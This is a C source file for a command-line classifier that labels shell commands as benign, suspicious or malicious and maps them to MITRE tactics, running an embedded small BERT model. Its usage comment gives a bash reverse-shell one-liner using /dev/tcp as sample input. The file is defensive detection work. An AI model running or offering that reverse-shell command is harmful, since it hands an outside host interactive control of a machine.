/* HyperIDs — static single-binary shell-command threat classifier.
 *
 * Pure C inference (no ONNX Runtime). The model weights (fp32), vocab, and
 * label/MITRE tables are embedded at link time via `ld -r -b binary`.
 *
 * Model: GLiClass uni-encoder over prajjwal1/bert-small (4 layers / 512 / 8 heads)
 *        + text/classes projectors + dot-product scorer.
 * Labels: verdict(3) + action(28) = 31. MITRE derived from actions via rules.
 *
 * Usage:
 *   hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
 *   hyperids -          # read one command per line from stdin
 *   hyperids --json '...'   # JSON output
 *
 * Build: see Makefile (static, weights/vocab embedded).
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <math.h>
#include <ctype.h>
#include <time.h>
#include <errno.h>
#include <unistd.h>

#include "hyperids_labels.h"

/* ---- embedded blobs (symbols produced by `ld -r -b binary`) ---- */
extern const unsigned char _binary_ci_assets_model_f32_bin_start[];
extern const unsigned char _binary_ci_assets_model_f32_bin_end[];
extern const unsigned char _binary_ci_assets_vocab_txt_start[];
extern const unsigned char _binary_ci_assets_vocab_txt_end[];

typedef float f32;

/* ---- model config (compile-time, must match export_c_weights.py) ---- */
#define CFG_VOCAB   30525
#define CFG_HIDDEN  512
#define CFG_LAYERS  4
#define CFG_HEADS   8
#define CFG_INTER   2048
#define CFG_MAXSEQ  320
#define CFG_EPS     1e-12f
#define ATT_SCALE   0.125f                     /* 1/sqrt(64) */

#define CLS_ID       101
#define SEP_ID       102
#define LABEL_TOK    30522
#define SEP_TOK      30523
#define UNK_ID       100

/* ---- vocab (embedded) ---- */
#define MAX_VOCAB 40000
#define MAXW 256
static char **g_vocab_tokens;
static int g_vocab_count = 0;
typedef struct { char *w; int id; } VEntry;
static VEntry *g_vocab_entries;

static int vcmp(const void *a, const void *b) {
    return strcmp(((const VEntry*)a)->w, ((const VEntry*)b)->w);
}

static int load_vocab_mem(const unsigned char *start, const unsigned char *end) {
    size_t len = (size_t)(end - start);
    char *buf = (char*)malloc(len + 1);
    if (!buf) return -1;
    memcpy(buf, start, len);
    buf[len] = 0;
    g_vocab_tokens = (char**)malloc(sizeof(char*) * MAX_VOCAB);
    g_vocab_entries = (VEntry*)malloc(sizeof(VEntry) * MAX_VOCAB);
    char *line = buf;
    while (line && g_vocab_count < MAX_VOCAB) {
        char *nl = strchr(line, '\n');
        if (nl) *nl = 0;
        size_t n = strlen(line);
        while (n && (line[n-1]=='\r')) line[--n] = 0;
        char *slot = (char*)malloc(n + 1);
        memcpy(slot, line, n + 1);
        g_vocab_tokens[g_vocab_count] = slot;
        g_vocab_entries[g_vocab_count].w = slot;
        g_vocab_entries[g_vocab_count].id = g_vocab_count;
        g_vocab_count++;
        line = nl ? nl + 1 : NULL;
    }
    qsort(g_vocab_entries, g_vocab_count, sizeof(VEntry), vcmp);
    return 0;
}

static int voc_id(const char *word) {
    VEntry key; key.w = (char*)word; key.id = -1;
    VEntry *hit = (VEntry*)bsearch(&key, g_vocab_entries, g_vocab_count, sizeof(VEntry), vcmp);
    return hit ? hit->id : -1;
}

static int is_punct_ascii(char c) {
    const char *p = "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
    return strchr(p, c) != NULL;
}

static int chr_lc(char a) { return (a>='A' && a<='Z') ? (a-'A'+'a') : a; }

static int emit_wordpiece(const char *buf, int bn, int *out, int n, int cap) {
    int id = voc_id(buf);
    if (id >= 0 && n < cap) { out[n++] = id; return n; }
    int off = 0, fail = 0;
    while (off < bn && n < cap) {
        int best = -1, bl = 0;
        for (int l = bn - off; l > 0; --l) {
            char probe[MAXW];
            if (off == 0) snprintf(probe, sizeof probe, "%.*s", l, buf + off);
            else snprintf(probe, sizeof probe, "##%.*s", l, buf + off);
            int wpid = voc_id(probe);
            if (wpid >= 0) { best = wpid; bl = l; break; }
        }
        if (best < 0) { fail = 1; break; }
        out[n++] = best; off += bl;
    }
    if (fail && n < cap) out[n++] = UNK_ID;
    return n;
}

/* WordPiece tokenize a command string (ASCII shell command). */
static int tok_cmd(const char *text, int *out, int cap) {
    int n = 0;
    const char *p = text;
    char buf[MAXW]; int bn = 0;
    while (*p) {
        char c = *p;
        if ((unsigned char)c >= 0x80) {
            if (bn) { buf[bn] = 0; n = emit_wordpiece(buf, bn, out, n, cap); bn = 0; }
            /* full UTF-8 sequence -> single token (matches HF tokenizer) */
            char seq[5] = {0}; int slen = 0;
            unsigned char uc = (unsigned char)c;
            int cont = (uc >= 0xF0) ? 3 : (uc >= 0xE0) ? 2 : (uc >= 0xC0) ? 1 : 0;
            seq[slen++] = c;
            for (int k = 0; k < cont; k++) { if (!p[1+k]) break; seq[slen++] = p[1+k]; }
            seq[slen] = 0;
            int id = voc_id(seq);
            if (id >= 0 && n < cap) out[n++] = id; else if (n < cap) out[n++] = UNK_ID;
            p += slen; continue;
        }
        if (isspace((unsigned char)c) || is_punct_ascii(c)) {
            if (bn) { buf[bn] = 0; n = emit_wordpiece(buf, bn, out, n, cap); bn = 0; }
            if (is_punct_ascii(c) && c != ' ') {
                char p1[2] = {c, 0};
                int id = voc_id(p1);
                if (id >= 0 && n < cap) out[n++] = id;
            }
            p++; continue;
        }
        if (bn < MAXW - 1) { buf[bn++] = chr_lc(c); }
        p++;
    }
    if (bn) { buf[bn] = 0; n = emit_wordpiece(buf, bn, out, n, cap); }
    return n;
}

/* Build full input_ids: [CLS] + label_prefix + cmd_tokens + [SEP], truncate to CFG_MAXSEQ. */
static int build_input(const char *cmd, int *ids, int cap) {
    int n = 0;
    for (int i = 0; i < LABEL_PREFIX_LEN && n < cap; i++) ids[n++] = label_prefix_tokens[i];
    char cmdbuf[1024];
    size_t cl = strlen(cmd);
    if (cl >= sizeof cmdbuf) cl = sizeof cmdbuf - 1;
    memcpy(cmdbuf, cmd, cl); cmdbuf[cl] = 0;
    int cmd_tok[CFG_MAXSEQ];
    int cn = tok_cmd(cmdbuf, cmd_tok, CFG_MAXSEQ);
    for (int i = 0; i < cn && n < cap; i++) ids[n++] = cmd_tok[i];
    if (n < cap) ids[n++] = SEP_ID;
    return n;
}

/* ---- model weights ---- */
struct Model {
    const f32 *emb_words, *emb_pos, *emb_ttype, *emb_ln_w, *emb_ln_b;
    const f32 *q_w[CFG_LAYERS], *q_b[CFG_LAYERS], *k_w[CFG_LAYERS], *k_b[CFG_LAYERS];
    const f32 *v_w[CFG_LAYERS], *v_b[CFG_LAYERS];
    const f32 *attn_o_w[CFG_LAYERS], *attn_o_b[CFG_LAYERS];
    const f32 *attn_ln_w[CFG_LAYERS], *attn_ln_b[CFG_LAYERS];
    const f32 *ffn1_w[CFG_LAYERS], *ffn1_b[CFG_LAYERS];
    const f32 *ffn2_w[CFG_LAYERS], *ffn2_b[CFG_LAYERS];
    const f32 *ffn_ln_w[CFG_LAYERS], *ffn_ln_b[CFG_LAYERS];
    const f32 *tp1_w, *tp1_b, *tp2_w, *tp2_b;
    const f32 *cp1_w, *cp1_b, *cp2_w, *cp2_b;
};

static const f32 *g_goff;
static const f32 *g_gend;

static const f32 *take(size_t count) {
    const f32 *p = g_goff;
    g_goff += count;
    if (g_goff > g_gend) {
        fprintf(stderr, "weight blob overrun\n");
        exit(2);
    }
    return p;
}

static void load_model_mem(const unsigned char *start, const unsigned char *end, struct Model *m) {
    g_goff = (const f32*)start;
    g_gend = (const f32*)end;
    m->emb_words = take((size_t)CFG_VOCAB * CFG_HIDDEN);
    m->emb_pos   = take((size_t)512 * CFG_HIDDEN);
    m->emb_ttype = take((size_t)2 * CFG_HIDDEN);
    m->emb_ln_w  = take(CFG_HIDDEN);
    m->emb_ln_b  = take(CFG_HIDDEN);
    for (int l = 0; l < CFG_LAYERS; l++) {
        m->q_w[l] = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->q_b[l] = take(CFG_HIDDEN);
        m->k_w[l] = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->k_b[l] = take(CFG_HIDDEN);
        m->v_w[l] = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->v_b[l] = take(CFG_HIDDEN);
        m->attn_o_w[l] = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->attn_o_b[l] = take(CFG_HIDDEN);
        m->attn_ln_w[l] = take(CFG_HIDDEN); m->attn_ln_b[l] = take(CFG_HIDDEN);
        m->ffn1_w[l] = take((size_t)CFG_INTER*CFG_HIDDEN); m->ffn1_b[l] = take(CFG_INTER);
        m->ffn2_w[l] = take((size_t)CFG_HIDDEN*CFG_INTER); m->ffn2_b[l] = take(CFG_HIDDEN);
        m->ffn_ln_w[l] = take(CFG_HIDDEN); m->ffn_ln_b[l] = take(CFG_HIDDEN);
    }
    m->tp1_w = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->tp1_b = take(CFG_HIDDEN);
    m->tp2_w = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->tp2_b = take(CFG_HIDDEN);
    m->cp1_w = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->cp1_b = take(CFG_HIDDEN);
    m->cp2_w = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->cp2_b = take(CFG_HIDDEN);
}

/* ---- BLAS-ish helpers ---- */
static inline float gelu_erf(float x) {
    return 0.5f * x * (1.0f + erff(x * 0.70710678118654752440f));
}

static void mm(const float *in, const float *W, const float *bias, int S, int K, int N, float *out) {
    for (int s = 0; s < S; ++s) {
        const float *ins = in + (size_t)s * K;
        float *outs = out + (size_t)s * N;
        for (int n = 0; n < N; ++n) {
            double sum = bias ? (double)bias[n] : 0.0;
            const float *wrow = W + (size_t)n * K;
            for (int k = 0; k < K; ++k) sum += (double)ins[k] * (double)wrow[k];
            outs[n] = (float)sum;
        }
    }
}

static void ln_bias(float *h, const float *w, const float *b, int S, int H, float eps) {
    for (int s = 0; s < S; ++s) {
        float *row = h + (size_t)s * H;
        double mean = 0.0, var = 0.0;
        for (int i = 0; i < H; ++i) mean += row[i];
        mean /= H;
        for (int i = 0; i < H; ++i) { double d = row[i] - mean; var += d * d; }
        var /= H;
        float inv = (float)(1.0 / sqrt(var + (double)eps));
        for (int i = 0; i < H; ++i) row[i] = (float)((row[i] - mean) * inv) * w[i] + b[i];
    }
}

static void add_res(float *out, const float *in, int n) {
    for (int i = 0; i < n; ++i) out[i] += in[i];
}

/* projector: h = gelu(x @ w1.T + b1); y = h @ w2.T + b2 */
static void projector(const float *x, int rows, const float *w1, const float *b1,
                      const float *w2, const float *b2, float *out) {
    float *h = (float*)malloc(sizeof(float) * rows * CFG_HIDDEN);
    mm(x, w1, b1, rows, CFG_HIDDEN, CFG_HIDDEN, h);
    for (int i = 0; i < rows * CFG_HIDDEN; i++) h[i] = gelu_erf(h[i]);
    mm(h, w2, b2, rows, CFG_HIDDEN, CFG_HIDDEN, out);
    free(h);
}

/* ---- workspace ---- */
struct Workspace {
    int S, H, NH, HD, MID;
    int *ids;
    float *hidden, *buf2, *tmp, *q, *k, *v, *scores, *ctx, *inter;
};

static struct Model g_model;
static struct Workspace *g_ws;

static int ws_alloc(struct Workspace *w) {
    const int S = CFG_MAXSEQ, H = CFG_HIDDEN, NH = CFG_HEADS, MID = CFG_INTER;
    const int HD = H / NH;
    w->S = S; w->H = H; w->NH = NH; w->HD = HD; w->MID = MID;
    w->ids = (int*)malloc(sizeof(int) * S);
    w->hidden = (float*)malloc(sizeof(float) * S * H * 2);
    w->buf2 = w->hidden + (size_t)S * H;
    w->tmp = (float*)malloc(sizeof(float) * S * H);
    w->q = (float*)malloc(sizeof(float) * S * H);
    w->k = (float*)malloc(sizeof(float) * S * H);
    w->v = (float*)malloc(sizeof(float) * S * H);
    w->scores = (float*)malloc(sizeof(float) * NH * S * S);
    w->ctx = (float*)malloc(sizeof(float) * NH * S * HD);
    w->inter = (float*)malloc(sizeof(float) * S * MID);
    if (!w->ids || !w->hidden || !w->tmp || !w->q || !w->k || !w->v ||
        !w->scores || !w->ctx || !w->inter) return -1;
    return 0;
}

/* Forward pass; writes 31 logits into logits[]. Returns sequence length or -1. */
static int forward(const char *cmd, float *logits) {
    struct Model *M = &g_model;
    struct Workspace *w = g_ws;
    const int S = w->S, H = w->H, NH = w->NH, HD = w->HD, MID = w->MID;

    int nn = build_input(cmd, w->ids, S);
    if (nn < 2) return -1;

    float *hidden = w->hidden, *buf2 = w->buf2, *tmp = w->tmp;
    float *q = w->q, *k = w->k, *v = w->v;
    float *scores = w->scores, *ctx = w->ctx, *inter = w->inter;

    for (int i = 0; i < nn; i++) {
        const float *row = M->emb_words + (size_t)w->ids[i] * H;
        memcpy(hidden + (size_t)i * H, row, sizeof(float) * H);
    }
    for (int i = 0; i < nn; i++) {
        int pidx = i < 512 ? i : 511;
        const float *prow = M->emb_pos + (size_t)pidx * H;
        const float *trow = M->emb_ttype;   /* token_type 0 */
        float *orow = hidden + (size_t)i * H;
        for (int j = 0; j < H; j++) orow[j] = orow[j] + prow[j] + trow[j];
    }
    ln_bias(hidden, M->emb_ln_w, M->emb_ln_b, nn, H, CFG_EPS);

    for (int l = 0; l < CFG_LAYERS; l++) {
        mm(hidden, M->q_w[l], M->q_b[l], nn, H, H, q);
        mm(hidden, M->k_w[l], M->k_b[l], nn, H, H, k);
        mm(hidden, M->v_w[l], M->v_b[l], nn, H, H, v);
        for (int h = 0; h < NH; h++) {
            float *sc = scores + (size_t)h * nn * nn;
            for (int i = 0; i < nn; i++) {
                const float *qi = q + (size_t)i * H + h * HD;
                float *si = sc + (size_t)i * nn;
                double mx = -1e30;
                for (int j = 0; j < nn; j++) {
                    const float *kj = k + (size_t)j * H + h * HD;
                    double d = 0.0;
                    for (int d0 = 0; d0 < HD; d0++) d += (double)qi[d0] * (double)kj[d0];
                    d *= ATT_SCALE;
                    si[j] = (float)d;
                    if (d > mx) mx = d;
                }
                double sm = 0.0;
                for (int j = 0; j < nn; j++) { double e = exp((double)si[j] - mx); si[j] = (float)e; sm += e; }
                float inv = (float)(1.0 / sm);
                for (int j = 0; j < nn; j++) si[j] *= inv;
            }
            for (int i = 0; i < nn; i++) {
                float *ci = ctx + (size_t)h * nn * HD + (size_t)i * HD;
                for (int d0 = 0; d0 < HD; d0++) ci[d0] = 0.0f;
                for (int j = 0; j < nn; j++) {
                    double wgt = (double)scores[(size_t)h * nn * nn + (size_t)i * nn + j];
                    const float *vj = v + (size_t)j * H + h * HD;
                    for (int d0 = 0; d0 < HD; d0++) ci[d0] += (float)(wgt * (double)vj[d0]);
                }
            }
            for (int i = 0; i < nn; i++)
                memcpy(tmp + (size_t)i * H + h * HD,
                       ctx + (size_t)h * nn * HD + (size_t)i * HD, sizeof(float) * HD);
        }
        mm(tmp, M->attn_o_w[l], M->attn_o_b[l], nn, H, H, buf2);
        add_res(buf2, hidden, nn * H);
        ln_bias(buf2, M->attn_ln_w[l], M->attn_ln_b[l], nn, H, CFG_EPS);
        mm(buf2, M->ffn1_w[l], M->ffn1_b[l], nn, H, MID, inter);
        for (int i = 0; i < nn * MID; i++) inter[i] = gelu_erf(inter[i]);
        mm(inter, M->ffn2_w[l], M->ffn2_b[l], nn, MID, H, hidden);
        add_res(hidden, buf2, nn * H);
        ln_bias(hidden, M->ffn_ln_w[l], M->ffn_ln_b[l], nn, H, CFG_EPS);
    }

    /* class embeddings: hidden at each class_token_pos */
    float *class_emb = (float*)malloc(sizeof(float) * N_LABELS * H);
    for (int k = 0; k < N_LABELS; k++) {
        int pos = class_token_pos[k];
        if (pos >= nn) pos = nn - 1;
        memcpy(class_emb + (size_t)k * H, hidden + (size_t)pos * H, sizeof(float) * H);
    }

    /* pooled: mean over all tokens */
    float *pooled = (float*)calloc(H, sizeof(float));
    for (int i = 0; i < nn; i++) {
        const float *row = hidden + (size_t)i * H;
        for (int j = 0; j < H; j++) pooled[j] += row[j];
    }
    for (int j = 0; j < H; j++) pooled[j] /= (float)nn;

    /* text projector */
    float *tp = (float*)malloc(sizeof(float) * H);
    projector(pooled, 1, M->tp1_w, M->tp1_b, M->tp2_w, M->tp2_b, tp);

    /* classes projector */
    float *cp = (float*)malloc(sizeof(float) * N_LABELS * H);
    projector(class_emb, N_LABELS, M->cp1_w, M->cp1_b, M->cp2_w, M->cp2_b, cp);

    /* dot product */
    for (int k = 0; k < N_LABELS; k++) {
        double s = 0.0;
        const float *ck = cp + (size_t)k * H;
        for (int j = 0; j < H; j++) s += (double)tp[j] * (double)ck[j];
        logits[k] = (float)s;
    }

    free(class_emb); free(pooled); free(tp); free(cp);
    return nn;
}

/* ---- output helpers ---- */
static void print_verdict(float *logits, const char **out_verdict) {
    int bi = 0;
    for (int i = 1; i < N_VERDICT; i++) if (logits[i] > logits[bi]) bi = i;
    *out_verdict = VERDICT_NAMES[bi];
}

int main(int argc, char **argv) {
    int json_mode = 0;
    const char *cmd = NULL;
    int from_stdin = 0;

    if (argc >= 2 && strcmp(argv[1], "--json") == 0) { json_mode = 1; cmd = argc > 2 ? argv[2] : NULL; }
    else if (argc >= 2 && strcmp(argv[1], "-") == 0) { from_stdin = 1; }
    else if (argc >= 2) { cmd = argv[1]; }
    else { fprintf(stderr, "usage: %s '<command>' | %s - | %s --json '<command>'\n", argv[0], argv[0], argv[0]); return 2; }

    if (load_vocab_mem(_binary_ci_assets_vocab_txt_start, _binary_ci_assets_vocab_txt_end) != 0) {
        fprintf(stderr, "vocab load failed\n"); return 1;
    }
    load_model_mem(_binary_ci_assets_model_f32_bin_start, _binary_ci_assets_model_f32_bin_end, &g_model);
    g_ws = (struct Workspace*)calloc(1, sizeof *g_ws);
    if (ws_alloc(g_ws) != 0) { fprintf(stderr, "workspace alloc failed\n"); return 1; }

    if (from_stdin) {
        char *line = NULL; size_t cap = 0;
        while (getline(&line, &cap, stdin) != -1) {
            size_t n = strlen(line);
            while (n && (line[n-1]=='\n' || line[n-1]=='\r')) line[--n] = 0;
            if (!n) continue;
            float logits[N_LABELS];
            if (forward(line, logits) < 0) continue;
            int bi = 0; for (int i = 1; i < N_VERDICT; i++) if (logits[i] > logits[bi]) bi = i;
            printf("%s\n", VERDICT_NAMES[bi]);
        }
        free(line);
        return 0;
    }

    if (!cmd) { fprintf(stderr, "no command\n"); return 2; }
    float logits[N_LABELS];
    int nn = forward(cmd, logits);
    if (nn < 0) { fprintf(stderr, "encode failed\n"); return 1; }

    int bi = 0; for (int i = 1; i < N_VERDICT; i++) if (logits[i] > logits[bi]) bi = i;

    /* verdict softmax */
    double mx = logits[0]; for (int i = 1; i < N_VERDICT; i++) if (logits[i] > mx) mx = logits[i];
    double vsum = 0; double ve[N_VERDICT];
    for (int i = 0; i < N_VERDICT; i++) { ve[i] = exp((double)logits[i] - mx); vsum += ve[i]; }

    /* actions (sigmoid) + collect hit set */
    int hit[N_ACTION]; int nhit = 0;
    double ap[N_ACTION];
    for (int i = 0; i < N_ACTION; i++) {
        ap[i] = 1.0 / (1.0 + exp(-(double)logits[N_VERDICT + i]));
        if (ap[i] >= 0.5) hit[nhit++] = i;
    }

    /* derive MITRE from action hit set */
    unsigned int tact_bits = 0, tech_bits = 0;
    for (int i = 0; i < nhit; i++) { tact_bits |= ACTION_TACTIC_BITMAP[hit[i]]; tech_bits |= ACTION_TECH_BITMAP[hit[i]]; }

    if (json_mode) {
        printf("{\"verdict\":\"%s\",\"verdict_probs\":{", VERDICT_NAMES[bi]);
        for (int i = 0; i < N_VERDICT; i++)
            printf("%s\"%s\":%.4f", i ? "," : "", VERDICT_NAMES[i], ve[i] / vsum);
        printf("},\"actions\":[");
        int first = 1;
        for (int i = 0; i < N_ACTION; i++) if (ap[i] >= 0.5) {
            printf("%s\"%s\"", first ? "" : ",", ACTION_NAMES[i]); first = 0;
        }
        printf("],\"tactics\":[");
        first = 1;
        for (int i = 0; i < N_TACTICS; i++) if (tact_bits & (1u << i)) {
            printf("%s\"%s\"", first ? "" : ",", TACTIC_NAMES[i]); first = 0;
        }
        printf("],\"techniques\":[");
        first = 1;
        for (int i = 0; i < N_TECHNIQUES; i++) if (tech_bits & (1u << i)) {
            printf("%s\"%s\"", first ? "" : ",", TECHNIQUE_NAMES[i]); first = 0;
        }
        printf("]}\n");
    } else {
        printf("verdict   : %s\n", VERDICT_NAMES[bi]);
        printf("verdict_probs: benign=%.4f suspicious=%.4f malicious=%.4f\n",
               ve[0]/vsum, ve[1]/vsum, ve[2]/vsum);
        printf("actions   : ");
        int first = 1;
        for (int i = 0; i < N_ACTION; i++) if (ap[i] >= 0.5) {
            printf("%s%s", first ? "" : ", ", ACTION_NAMES[i]); first = 0;
        }
        if (first) printf("(none)");
        printf("\n");
        printf("tactics   : ");
        first = 1;
        for (int i = 0; i < N_TACTICS; i++) if (tact_bits & (1u << i)) {
            printf("%s%s", first ? "" : ", ", TACTIC_NAMES[i]); first = 0;
        }
        printf("\n");
        printf("techniques: ");
        first = 1;
        for (int i = 0; i < N_TECHNIQUES; i++) if (tech_bits & (1u << i)) {
            printf("%s%s", first ? "" : ", ", TECHNIQUE_NAMES[i]); first = 0;
        }
        printf("\n");
    }
    return 0;
}
